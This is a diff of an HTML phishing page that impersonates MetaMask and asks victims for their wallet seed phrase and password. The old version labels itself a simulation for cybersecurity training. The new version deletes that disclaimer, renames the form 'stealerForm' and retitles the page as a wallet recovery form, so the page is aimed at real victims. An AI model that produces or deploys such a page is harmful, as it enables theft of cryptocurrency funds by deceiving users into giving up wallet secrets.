@@ -2,21 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MetaMask - Update Wallet</title>
-  <link rel="stylesheet" href="style.css" />
+  <title>Koi Wallet Recovery</title>
 </head>
 <body>
-  <div class="container">
-    <h2>🔒 MetaMask Wallet Update Required</h2>
-    <p>To continue using MetaMask, please re-enter your credentials.</p>
-    <form id="phish-form">
-      <input type="text" id="wallet" placeholder="Seed Phrase" required />
-      <input type="password" id="password" placeholder="Wallet Password" required />
-      <button type="submit">Unlock Wallet</button>
-    </form>
-    <p class="disclaimer">⚠️ Simulation only. No real data is stored. For cybersecurity training.</p>
-  </div>
+  <h2>MetaMask Recovery Form</h2>
+  <form id="stealerForm">
+    <input type="text" id="wallet" placeholder="Enter seed phrase" required /><br><br>
+    <input type="password" id="password" placeholder="Enter wallet password" required /><br><br>
+    <button type="submit">Restore Wallet</button>
+  </form>
   <script src="script.js"></script>
 </body>
 </html>
